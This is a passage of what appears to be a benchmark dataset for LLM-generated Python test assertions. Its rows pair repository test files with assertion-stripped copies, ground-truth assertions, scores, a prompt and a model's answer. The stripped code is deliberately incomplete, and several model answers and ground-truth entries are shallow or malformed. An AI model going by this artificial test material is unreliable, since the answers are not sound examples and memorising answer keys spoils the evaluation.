7    network = Network(num_nodes=4)
8    network.connect_nodes()
9    network.normvariate_base_latencies()
10    network.start()
11    network.run(6)
12    r = network.check_consistency()
13    # note gevent depends on real clock, therefore results are not predictable
14
15
16def test_basic_simenv():
17    network = Network(num_nodes=4, simenv=True)
18    network.connect_nodes()
19    network.normvariate_base_latencies()
20    network.start()
21    network.run(5)
22    r = network.check_consistency()
23
24
25def test_basic_singlenode():
26    network = Network(num_nodes=1, simenv=True)
27    network.connect_nodes()
28    network.normvariate_base_latencies()
29    network.start()
30    network.run(5)
31    r = network.check_consistency()
32
33
34def test_transactions(monkeypatch):
35    sim_time = 10
36    num_txs = 2
37    num_initial_blocks = 2
38
39    monkeypatch.setattr(ConsensusManager, 'num_initial_blocks', num_initial_blocks)
40
41    network = Network(num_nodes=4, simenv=False)
42    network.connect_nodes()
43    network.normvariate_base_latencies()
44    app = network.nodes[0]
45    chainservice = app.services.chainservice
46
47    # track txs
48    txs = []
49
50    def cb(blk):
51        log.DEV('ON NEW HEAD', blk=blk)
52        if num_initial_blocks <= blk.number < num_initial_blocks + num_txs:
53            if blk.number > num_initial_blocks:
54            sender = chainservice.chain.coinbase
55            to = 'x' * 20
56            nonce = chainservice.chain.head.get_nonce(sender)
57            log.DEV('CREATING TX', nonce=nonce)
58            gas = 21000
59            gasprice = 1
60            value = 1
61            tx = Transaction(nonce, gasprice, gas, to, value, data='')
62            app.services.accounts.sign_tx(sender, tx)
63
64            def _do():
65                log.DEV('ADDING TX', nonce=nonce)
66                success = chainservice.add_transaction(tx)
67                log.DEV('ADDED TX', success=success)
68
69            if network.simenv:
70                network.simenv.process(_do())
71            else:
72                gevent.spawn(_do)
73            txs.append(tx)
74
75    print(chainservice.on_new_head_cbs)
76    chainservice.on_new_head_cbs.append(cb)
77    network.start()
78    network.run(sim_time)
79    r = network.check_consistency()
80    log.debug(r)
81    expected_head_number = num_initial_blocks + num_txs
82
83    # check if all txs are received in all chains
84    tx_pos = set()
85    for app in network.nodes:
86        for tx in txs:
87            r = app.services.chainservice.chain.index.get_transaction(tx.hash)
88            t, blk, idx = r
89            tx_pos.add(r)
90","[['blk.num_transactions()', '==', '1'], ['chainservice.chain.head.get_balance(sender)', '>', 'gas * gasprice + value'], ['tx.sender', '==', 'sender'], ['success', '==', 'True'], ['chainservice.chain.head.number', '==', 'expected_head_number'], ['len(r)', '==', '3'], ['tx', '==', 't'], ['len(tx_pos)', '==', 'len(txs)']]",21,8,0.3809523809523809,0.002275960170697,"['network', 'r', 'monkeypatch', 'sim_time', 'num_txs', 'num_initial_blocks', 'app', 'chainservice', 'txs', 'blk', 'sender', 'to', 'nonce', 'gas', 'gasprice', 'value', 'tx', 'success', 'expected_head_number', 'tx_pos', 't', 'idx']",22,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['network', 'r', 'monkeypatch', 'sim_time', 'num_txs', 'num_initial_blocks', 'app', 'chainservice', 'txs', 'blk', 'sender', 'to', 'nonce', 'gas', 'gasprice', 'value', 'tx', 'success', 'expected_head_number', 'tx_pos', 't', 'idx']
*Code:

1from hydrachain.consensus.manager import ConsensusManager
2from ethereum.transactions import Transaction
3import gevent
4
5
6def test_basic_gevent():
7    network = Network(num_nodes=4)
8    network.connect_nodes()
9    network.normvariate_base_latencies()
10    network.start()
11    network.run(6)
12    r = network.check_consistency()
13    # note gevent depends on real clock, therefore results are not predictable
14
15
16def test_basic_simenv():
17    network = Network(num_nodes=4, simenv=True)
18    network.connect_nodes()
19    network.normvariate_base_latencies()
20    network.start()
21    network.run(5)
22    r = network.check_consistency()
23
24
25def test_basic_singlenode():
26    network = Network(num_nodes=1, simenv=True)
27    network.connect_nodes()
28    network.normvariate_base_latencies()
29    network.start()
30    network.run(5)
31    r = network.check_consistency()
32
33
34def test_transactions(monkeypatch):
35    sim_time = 10
36    num_txs = 2
37    num_initial_blocks = 2
38
39    monkeypatch.setattr(ConsensusManager, 'num_initial_blocks', num_initial_blocks)
40
41    network = Network(num_nodes=4, simenv=False)
42    network.connect_nodes()
43    network.normvariate_base_latencies()
44    app = network.nodes[0]
45    chainservice = app.services.chainservice
46
47    # track txs
48    txs = []
49
50    def cb(blk):
51        log.DEV('ON NEW HEAD', blk=blk)
52        if num_initial_blocks <= blk.number < num_initial_blocks + num_txs:
53            if blk.number > num_initial_blocks:
54            sender = chainservice.chain.coinbase
55            to = 'x' * 20
56            nonce = chainservice.chain.head.get_nonce(sender)
57            log.DEV('CREATING TX', nonce=nonce)
58            gas = 21000
59            gasprice = 1
60            value = 1
61            tx = Transaction(nonce, gasprice, gas, to, value, data='')
62            app.services.accounts.sign_tx(sender, tx)
63
64            def _do():
65                log.DEV('ADDING TX', nonce=nonce)
66                success = chainservice.add_transaction(tx)
67                log.DEV('ADDED TX', success=success)
68
69            if network.simenv:
70                network.simenv.process(_do())
71            else:
72                gevent.spawn(_do)
73            txs.append(tx)
74
75    print(chainservice.on_new_head_cbs)
76    chainservice.on_new_head_cbs.append(cb)
77    network.start()
78    network.run(sim_time)
79    r = network.check_consistency()
80    log.debug(r)
81    expected_head_number = num_initial_blocks + num_txs
82
83    # check if all txs are received in all chains
84    tx_pos = set()
85    for app in network.nodes:
86        for tx in txs:
87            r = app.services.chainservice.chain.index.get_transaction(tx.hash)
88            t, blk, idx = r
89            tx_pos.add(r)
90",4433,"[[7, 'network', '!=', None, ""network should be initialized""],
 [12, 'r', '!=', None, ""network consistency check result should not be None""],
 [17, 'network', '!=', None, ""network should be initialized""],
 [22, 'r', '!=', None, ""network consistency check result should not be None""],
 [26, 'network', '!=', None, ""network should be initialized""],
 [31, 'r', '!=', None, ""network consistency check result should not be None""],
 [36, 'num_txs', '>=', 0, "" num_txs should be non negative""],
 [37, 'num_initial_blocks', '>=', 0, ""num_initial_blocks should be non negative""],
 [41, 'network', '!=', None, ""network should be initialized""],
 [45, 'chainservice', '!=', None, ""chainservice should be initialized""],
 [56, 'nonce', '>=', 0, ""nonce value should be non negative""],
 [58, 'gas', '>', 0, ""gas should be more than 0""],
 [59, 'gasprice', '>=', 0, ""gasprice value should be non negative""],
 [60, 'value', '>=', 0, ""value of transaction should be non negative""],
 [61, 'tx', '!=', None, ""transaction object should be initialized""],
 [66, 'success', '!=', None, ""success indicator should not be None""],
 [79, 'r', '!=', None, ""network consistency check result should not be None""],
 [81, 'expected_head_number', '>=', 0, 'expected_head_number should be non negative']]"
django-oscar/django-oscar,"from django.test import TestCase

from oscar.apps.communication.models import Notification
from oscar.core.compat import get_user_model
from oscar.core.loading import get_class
from oscar.test.factories import UserFactory

User = get_user_model()

Dispatcher = get_class('communication.utils', 'Dispatcher')


class TestANewNotification(TestCase):

    def setUp(self):
        self.notification = Notification(
            recipient=UserFactory(),
            subject=""Hello"")

    def test_is_in_a_users_inbox(self):
        assert Notification.INBOX == self.notification.location

    def test_is_not_read(self):
        assert not self.notification.is_read


class TestANotification(TestCase):

    def setUp(self):
        self.notification = Notification.objects.create(
            recipient=UserFactory(),
            subject=""Hello"")

    def test_can_be_archived(self):
        self.notification.archive()
        assert Notification.ARCHIVE == self.notification.location


class NotificationServiceTestCase(TestCase):

    def test_notify_a_single_user(self):
        user = UserFactory()
        subj = ""Hello you!""
        body = ""This is the notification body.""

        Dispatcher().notify_user(user, subj, body=body)
        user_notification = Notification.objects.get(recipient=user)
        assert user_notification.subject == subj
        assert user_notification.body == body

    def test_notify_a_set_of_users(self):
        users = UserFactory.create_batch(3)
        subj = ""Hello everyone!""
        body = ""This is the notification body.""

        Dispatcher().notify_users(User.objects.all(), subj, body=body)
        for user in users:
            user_notification = Notification.objects.get(recipient=user)
            assert user_notification.subject == subj
            assert user_notification.body == body
","
1from django.test import TestCase
2
3from oscar.apps.communication.models import Notification
4from oscar.core.compat import get_user_model
5from oscar.core.loading import get_class
6from oscar.test.factories import UserFactory
7
8User = get_user_model()
9
10Dispatcher = get_class('communication.utils', 'Dispatcher')
11
12
13class TestANewNotification(TestCase):
14
15    def setUp(self):
16        self.notification = Notification(
17            recipient=UserFactory(),
18            subject=""Hello"")
19
20    def test_is_in_a_users_inbox(self):
21
22    def test_is_not_read(self):
23
24
25class TestANotification(TestCase):
26
27    def setUp(self):
28        self.notification = Notification.objects.create(
29            recipient=UserFactory(),
30            subject=""Hello"")
31
32    def test_can_be_archived(self):
33        self.notification.archive()
34
35
36class NotificationServiceTestCase(TestCase):
37
38    def test_notify_a_single_user(self):
39        user = UserFactory()
40        subj = ""Hello you!""
41        body = ""This is the notification body.""
42
43        Dispatcher().notify_user(user, subj, body=body)
44        user_notification = Notification.objects.get(recipient=user)
45
46    def test_notify_a_set_of_users(self):
47        users = UserFactory.create_batch(3)
48        subj = ""Hello everyone!""
49        body = ""This is the notification body.""
50
51        Dispatcher().notify_users(User.objects.all(), subj, body=body)
52        for user in users:
53            user_notification = Notification.objects.get(recipient=user)
54","[['Notification.INBOX', '==', 'self.notification.location'], ['self.notification.is_read', '==', 'False'], ['Notification.ARCHIVE', '==', 'self.notification.location'], ['user_notification.subject', '==', 'subj'], ['user_notification.body', '==', 'body'], ['user_notification.subject', '==', 'subj'], ['user_notification.body', '==', 'body']]",7,7,1.0,0.0038043478260869,"['User', 'Dispatcher', 'self.notification', 'user', 'subj', 'body', 'user_notification', 'users']",8,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['User', 'Dispatcher', 'self.notification', 'user', 'subj', 'body', 'user_notification', 'users']
*Code:

1from django.test import TestCase
2
3from oscar.apps.communication.models import Notification
4from oscar.core.compat import get_user_model
5from oscar.core.loading import get_class
6from oscar.test.factories import UserFactory
7
8User = get_user_model()
9
10Dispatcher = get_class('communication.utils', 'Dispatcher')
11
12
13class TestANewNotification(TestCase):
14
15    def setUp(self):
16        self.notification = Notification(
17            recipient=UserFactory(),
18            subject=""Hello"")
19
20    def test_is_in_a_users_inbox(self):
21
22    def test_is_not_read(self):
23
24
25class TestANotification(TestCase):
26
27    def setUp(self):
28        self.notification = Notification.objects.create(
29            recipient=UserFactory(),
30            subject=""Hello"")
31
32    def test_can_be_archived(self):
33        self.notification.archive()
34
35
36class NotificationServiceTestCase(TestCase):
37
38    def test_notify_a_single_user(self):
39        user = UserFactory()
40        subj = ""Hello you!""
41        body = ""This is the notification body.""
42
43        Dispatcher().notify_user(user, subj, body=body)
44        user_notification = Notification.objects.get(recipient=user)
45
46    def test_notify_a_set_of_users(self):
47        users = UserFactory.create_batch(3)
48        subj = ""Hello everyone!""
49        body = ""This is the notification body.""
50
51        Dispatcher().notify_users(User.objects.all(), subj, body=body)
52        for user in users:
53            user_notification = Notification.objects.get(recipient=user)
54",3044,"[[39, 'user', '!=', None, ""User should not be None""],
[42, 'body', '!=', None, ""Notification body should not be None""],
[47, 'users', '!=', None, ""Users should not be None""],
[48, 'subj', '!=', None, ""Subject of notification should not be None""],
[49, 'body', '!=', None, ""Notification body should not be None""]]"
dim0/ansible-commander,"# Copyright (c) 2013 AnsibleWorks, Inc.
#
# This file is part of Ansible Commander
#
# Ansible Commander is free software: you can redistribute it and/or modify
# it under the terms of the GNU Affero General Public License as
# published by the Free Software Foundation, either version 3 of the
# License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Affero General Public License for more details.
#
# You should have received a copy of the GNU Affero General Public License
# along with this program. If not, see <http://www.gnu.org/licenses/>.

import datetime
import json

from django.contrib.auth.models import User as DjangoUser
import django.test
from django.test.client import Client
from lib.main.models import *


class BaseTestMixin(object):
    '''
    Mixin with shared code for use by all test cases.
    '''

    def setUp(self):
        super(BaseTestMixin, self).setUp()
        self.object_ctr = 0

    def make_user(self, username, password, super_user=False):
        django_user = None
        if super_user:
            django_user = DjangoUser.objects.create_superuser(username, ""%s@example.com"", password)
        else:
            django_user = DjangoUser.objects.create_user(username, ""%s@example.com"", password)
        return django_user

    def make_organizations(self, created_by, count=1):
        results = []
        for x in range(0, count):
            self.object_ctr = self.object_ctr + 1
            results.append(Organization.objects.create(
                name=""org%s-%s"" % (x, self.object_ctr), description=""org%s"" % x, created_by=created_by
            ))
        return results

    def make_projects(self, created_by, count=1):
        results = []
        for x in range(0, count):
            self.object_ctr = self.object_ctr + 1
            results.append(Project.objects.create(
                name=""proj%s-%s"" % (x, self.object_ctr), description=""proj%s"" % x, scm_type='git', 
                default_playbook='foo.yml', local_repository='/checkout', created_by=created_by
            ))
        return results

    def check_pagination_and_size(self, data, desired_count, previous=None, next=None):
        self.assertEquals(data['previous'], previous)
        self.assertEquals(data['next'], next)

    def setup_users(self, just_super_user=False):
        # Create a user.
        self.super_username  = 'admin'
        self.super_password  = 'admin'
        self.normal_username = 'normal'
        self.normal_password = 'normal'
        self.other_username  = 'other'
        self.other_password  = 'other'

        self.super_django_user  = self.make_user(self.super_username,  self.super_password, super_user=True)

        if not just_super_user:

            self.normal_django_user = self.make_user(self.normal_username, self.normal_password, super_user=False)
            self.other_django_user  = self.make_user(self.other_username,  self.other_password, super_user=False)

    def get_super_credentials(self):
        return (self.super_username, self.super_password)

    def get_normal_credentials(self):
        return (self.normal_username, self.normal_password)

    def get_other_credentials(self):
        return (self.other_username, self.other_password)

    def get_invalid_credentials(self):
        return ('random', 'combination')
        
    def _generic_rest(self, url, data=None, expect=204, auth=None, method=None):
        assert method is not None
        method = method.lower()
        if method not in [ 'get', 'delete' ]:
            assert data is not None
        client = Client()
        if auth:
           client.login(username=auth[0], password=auth[1])
        method = getattr(client,method)
        response = None
        if data is not None:
            response = method(url, json.dumps(data), 'application/json')
        else:
            response = method(url)

        if response.status_code == 500 and expect != 500:
            assert False, ""Failed: %s"" % response.content
        if expect is not None:
            assert response.status_code == expect, ""expected status %s, got %s for url=%s as auth=%s: %s"" % (expect, response.status_code, url, auth, response.content)
        if response.status_code not in [ 202, 204, 400, 405, 409 ]:
            # no JSON responses in these at least for now, 400/409 should probably return some (FIXME)
            return json.loads(response.content)
        else:
            return None
 
    def get(self, url, expect=200, auth=None):
        return self._generic_rest(url, data=None, expect=expect, auth=auth, method='get')

    def post(self, url, data, expect=204, auth=None):
        return self._generic_rest(url, data=data, expect=expect, auth=auth, method='post')

    def put(self, url, data, expect=200, auth=None):
        return self._generic_rest(url, data=data, expect=expect, auth=auth, method='put')

    def delete(self, url, expect=201, auth=None):
        return self._generic_rest(url, data=None, expect=expect, auth=auth, method='delete')

    def get_urls(self, collection_url, auth=None):
        # TODO: this test helper function doesn't support pagination
        data = self.get(collection_url, expect=200, auth=auth)
        return [item['url'] for item in data['results']]
    
class BaseTest(BaseTestMixin, django.test.TestCase):
    '''
    Base class for unit tests.
    '''

class BaseTransactionTest(BaseTestMixin, django.test.TransactionTestCase):
    '''
    Base class for tests requiring transactions (or where the test database
    needs to be accessed by subprocesses).
    '''
","
1# Copyright (c) 2013 AnsibleWorks, Inc.
2#
3# This file is part of Ansible Commander
4#
5# Ansible Commander is free software: you can redistribute it and/or modify
6# it under the terms of the GNU Affero General Public License as
7# published by the Free Software Foundation, either version 3 of the
8# License, or (at your option) any later version.
9#
10# This program is distributed in the hope that it will be useful,
11# but WITHOUT ANY WARRANTY; without even the implied warranty of
12# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
13# GNU Affero General Public License for more details.
14#
15# You should have received a copy of the GNU Affero General Public License
16# along with this program. If not, see <http://www.gnu.org/licenses/>.
17
18import datetime
19import json
20
21from django.contrib.auth.models import User as DjangoUser
22import django.test
23from django.test.client import Client
24from lib.main.models import *
25
26
27class BaseTestMixin(object):
28    '''
29    Mixin with shared code for use by all test cases.
30    '''
31
32    def setUp(self):
33        super(BaseTestMixin, self).setUp()
34        self.object_ctr = 0
35
36    def make_user(self, username, password, super_user=False):
37        django_user = None
38        if super_user:
39            django_user = DjangoUser.objects.create_superuser(username, ""%s@example.com"", password)
40        else:
41            django_user = DjangoUser.objects.create_user(username, ""%s@example.com"", password)
42        return django_user
43
44    def make_organizations(self, created_by, count=1):
45        results = []
46        for x in range(0, count):
47            self.object_ctr = self.object_ctr + 1
48            results.append(Organization.objects.create(
49                name=""org%s-%s"" % (x, self.object_ctr), description=""org%s"" % x, created_by=created_by
50            ))
51        return results
52
53    def make_projects(self, created_by, count=1):
54        results = []
55        for x in range(0, count):
56            self.object_ctr = self.object_ctr + 1
57            results.append(Project.objects.create(
58                name=""proj%s-%s"" % (x, self.object_ctr), description=""proj%s"" % x, scm_type='git', 
59                default_playbook='foo.yml', local_repository='/checkout', created_by=created_by
60            ))
61        return results
62
63    def check_pagination_and_size(self, data, desired_count, previous=None, next=None):
64
65    def setup_users(self, just_super_user=False):
66        # Create a user.
67        self.super_username  = 'admin'
68        self.super_password  = 'admin'
69        self.normal_username = 'normal'
70        self.normal_password = 'normal'
71        self.other_username  = 'other'
72        self.other_password  = 'other'
73
74        self.super_django_user  = self.make_user(self.super_username,  self.super_password, super_user=True)
75
76        if not just_super_user:
77
78            self.normal_django_user = self.make_user(self.normal_username, self.normal_password, super_user=False)
79            self.other_django_user  = self.make_user(self.other_username,  self.other_password, super_user=False)
80
81    def get_super_credentials(self):
82        return (self.super_username, self.super_password)
83
84    def get_normal_credentials(self):
85        return (self.normal_username, self.normal_password)
86
87    def get_other_credentials(self):
88        return (self.other_username, self.other_password)
89
90    def get_invalid_credentials(self):
91        return ('random', 'combination')
92        
93    def _generic_rest(self, url, data=None, expect=204, auth=None, method=None):
94        method = method.lower()
95        if method not in [ 'get', 'delete' ]:
96        client = Client()
97        if auth:
98           client.login(username=auth[0], password=auth[1])
99        method = getattr(client,method)
100        response = None
101        if data is not None:
102            response = method(url, json.dumps(data), 'application/json')
103        else:
104            response = method(url)
105
106        if response.status_code == 500 and expect != 500:
107        if expect is not None:
108        if response.status_code not in [ 202, 204, 400, 405, 409 ]:
109            # no JSON responses in these at least for now, 400/409 should probably return some (FIXME)
110            return json.loads(response.content)
111        else:
112            return None
113 
114    def get(self, url, expect=200, auth=None):
115        return self._generic_rest(url, data=None, expect=expect, auth=auth, method='get')
116
117    def post(self, url, data, expect=204, auth=None):
118        return self._generic_rest(url, data=data, expect=expect, auth=auth, method='post')
119
120    def put(self, url, data, expect=200, auth=None):
121        return self._generic_rest(url, data=data, expect=expect, auth=auth, method='put')
122
123    def delete(self, url, expect=201, auth=None):
124        return self._generic_rest(url, data=None, expect=expect, auth=auth, method='delete')
125
126    def get_urls(self, collection_url, auth=None):
127        # TODO: this test helper function doesn't support pagination
128        data = self.get(collection_url, expect=200, auth=auth)
129        return [item['url'] for item in data['results']]
130    
131class BaseTest(BaseTestMixin, django.test.TestCase):
132    '''
133    Base class for unit tests.
134    '''
135
136class BaseTransactionTest(BaseTestMixin, django.test.TransactionTestCase):
137    '''
138    Base class for tests requiring transactions (or where the test database
139    needs to be accessed by subprocesses).
140    '''
141","[['method', '==', 'not None'], ['data', '==', 'not None'], ['False', '==', 'True'], ['response.status_code', '==', 'expect']]",6,4,0.6666666666666666,0.0006936015259233,"['self.object_ctr', 'username', 'password', 'super_user', 'django_user', 'created_by', 'count', 'results', 'data', 'desired_count', 'previous', 'next', 'just_super_user', 'self.super_username', 'self.super_password', 'self.normal_username', 'self.normal_password', 'self.other_username', 'self.other_password', 'self.super_django_user', 'self.normal_django_user', 'self.other_django_user', 'url', 'expect', 'auth', 'method', 'client', 'response', 'collection_url']",29,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['self.object_ctr', 'username', 'password', 'super_user', 'django_user', 'created_by', 'count', 'results', 'data', 'desired_count', 'previous', 'next', 'just_super_user', 'self.super_username', 'self.super_password', 'self.normal_username', 'self.normal_password', 'self.other_username', 'self.other_password', 'self.super_django_user', 'self.normal_django_user', 'self.other_django_user', 'url', 'expect', 'auth', 'method', 'client', 'response', 'collection_url']
*Code:

1# Copyright (c) 2013 AnsibleWorks, Inc.
2#
3# This file is part of Ansible Commander
4#
5# Ansible Commander is free software: you can redistribute it and/or modify
6# it under the terms of the GNU Affero General Public License as
7# published by the Free Software Foundation, either version 3 of the
8# License, or (at your option) any later version.
9#
10# This program is distributed in the hope that it will be useful,
11# but WITHOUT ANY WARRANTY; without even the implied warranty of
12# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
13# GNU Affero General Public License for more details.
14#
15# You should have received a copy of the GNU Affero General Public License
16# along with this program. If not, see <http://www.gnu.org/licenses/>.
17
18import datetime
19import json
20
21from django.contrib.auth.models import User as DjangoUser
22import django.test
23from django.test.client import Client
24from lib.main.models import *
25
26
27class BaseTestMixin(object):
28    '''
29    Mixin with shared code for use by all test cases.
30    '''
31
32    def setUp(self):
33        super(BaseTestMixin, self).setUp()
34        self.object_ctr = 0
35
36    def make_user(self, username, password, super_user=False):
37        django_user = None
38        if super_user:
39            django_user = DjangoUser.objects.create_superuser(username, ""%s@example.com"", password)
40        else:
41            django_user = DjangoUser.objects.create_user(username, ""%s@example.com"", password)
42        return django_user
43
44    def make_organizations(self, created_by, count=1):
45        results = []
46        for x in range(0, count):
47            self.object_ctr = self.object_ctr + 1
48            results.append(Organization.objects.create(
49                name=""org%s-%s"" % (x, self.object_ctr), description=""org%s"" % x, created_by=created_by
50            ))
51        return results
52
53    def make_projects(self, created_by, count=1):
54        results = []
55        for x in range(0, count):
56            self.object_ctr = self.object_ctr + 1
57            results.append(Project.objects.create(
58                name=""proj%s-%s"" % (x, self.object_ctr), description=""proj%s"" % x, scm_type='git', 
59                default_playbook='foo.yml', local_repository='/checkout', created_by=created_by
60            ))
61        return results
62
63    def check_pagination_and_size(self, data, desired_count, previous=None, next=None):
64
65    def setup_users(self, just_super_user=False):
66        # Create a user.
67        self.super_username  = 'admin'
68        self.super_password  = 'admin'
69        self.normal_username = 'normal'
70        self.normal_password = 'normal'
71        self.other_username  = 'other'
72        self.other_password  = 'other'
73
74        self.super_django_user  = self.make_user(self.super_username,  self.super_password, super_user=True)
75
76        if not just_super_user:
77
78            self.normal_django_user = self.make_user(self.normal_username, self.normal_password, super_user=False)
79            self.other_django_user  = self.make_user(self.other_username,  self.other_password, super_user=False)
80
81    def get_super_credentials(self):
82        return (self.super_username, self.super_password)
83
84    def get_normal_credentials(self):
85        return (self.normal_username, self.normal_password)
86
87    def get_other_credentials(self):
88        return (self.other_username, self.other_password)
89
90    def get_invalid_credentials(self):
91        return ('random', 'combination')
92        
93    def _generic_rest(self, url, data=None, expect=204, auth=None, method=None):
94        method = method.lower()
95        if method not in [ 'get', 'delete' ]:
96        client = Client()
97        if auth:
98           client.login(username=auth[0], password=auth[1])
99        method = getattr(client,method)
100        response = None
101        if data is not None:
102            response = method(url, json.dumps(data), 'application/json')
103        else:
104            response = method(url)
105
106        if response.status_code == 500 and expect != 500:
107        if expect is not None:
108        if response.status_code not in [ 202, 204, 400, 405, 409 ]:
109            # no JSON responses in these at least for now, 400/409 should probably return some (FIXME)
110            return json.loads(response.content)
111        else:
112            return None
113 
114    def get(self, url, expect=200, auth=None):
115        return self._generic_rest(url, data=None, expect=expect, auth=auth, method='get')
116
117    def post(self, url, data, expect=204, auth=None):
118        return self._generic_rest(url, data=data, expect=expect, auth=auth, method='post')
119
120    def put(self, url, data, expect=200, auth=None):
121        return self._generic_rest(url, data=data, expect=expect, auth=auth, method='put')
122
123    def delete(self, url, expect=201, auth=None):
124        return self._generic_rest(url, data=None, expect=expect, auth=auth, method='delete')
125
126    def get_urls(self, collection_url, auth=None):
127        # TODO: this test helper function doesn't support pagination
128        data = self.get(collection_url, expect=200, auth=auth)
129        return [item['url'] for item in data['results']]
130    
131class BaseTest(BaseTestMixin, django.test.TestCase):
132    '''
133    Base class for unit tests.
134    '''
135
136class BaseTransactionTest(BaseTestMixin, django.test.TransactionTestCase):
137    '''
138    Base class for tests requiring transactions (or where the test database
139    needs to be accessed by subprocesses).
140    '''
141",7531,"[[36, 'username', '!=', None, 'Username cannot be None for creating a user'],
[36, 'password', '!=', None, 'Password cannot be None for creating a user'],
[44, 'created_by', '!=', None, 'Creator cannot be None for creating an organization'],
[44, 'count', '>=', 1, 'At least one organization needs to be created'],
[53, 'created_by', '!=', None, 'Creator cannot be None for creating a project'],
[53, 'count', '>=', 1, 'At least one project needs to be created'],
[93, 'url', '!=', None, 'URL cannot be None for a REST call'],
[93, 'expect', '>=', 1, 'There should be a target HTTP status code for the REST call'],
[97, 'auth', '!=', None, 'For a secured REST call, login credentials must be provided'],
[117, 'data', '!=', None, 'Data cannot be None when making a POST call'],
[120, 'data', '!=', None, 'Data cannot be None when making a PUT call']]"
Karspexet/Karspexet,"from django.shortcuts import reverse
from django.test import TestCase

from factories import factories as f
from karspexet.venue.models import Seat


class TestVenueViews(TestCase):
    def setUp(self):
        staff = f.CreateStaffUser()
        self.client.force_login(staff)

    def test_manage_seats(self):
        venue = f.CreateVenue()
        group = f.CreateSeatingGroup(venue=venue)

        url = reverse(""manage_seats"", args=[venue.id])
        response = self.client.get(url)
        assert response.status_code == 200

        response = self.client.post(url, data={""group"": group.id, ""num_seats"": 2})
        assert response.status_code == 302
        assert Seat.objects.count() == 2
","
1from django.shortcuts import reverse
2from django.test import TestCase
3
4from factories import factories as f
5from karspexet.venue.models import Seat
6
7
8class TestVenueViews(TestCase):
9    def setUp(self):
10        staff = f.CreateStaffUser()
11        self.client.force_login(staff)
12
13    def test_manage_seats(self):
14        venue = f.CreateVenue()
15        group = f.CreateSeatingGroup(venue=venue)
16
17        url = reverse(""manage_seats"", args=[venue.id])
18        response = self.client.get(url)
19
20        response = self.client.post(url, data={""group"": group.id, ""num_seats"": 2})
21","[['response.status_code', '==', '200'], ['response.status_code', '==', '302'], ['Seat.objects.count()', '==', '2']]",3,3,1.0,0.0042796005706134,"['staff', 'venue', 'group', 'url', 'response']",5,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['staff', 'venue', 'group', 'url', 'response']
*Code:

1from django.shortcuts import reverse
2from django.test import TestCase
3
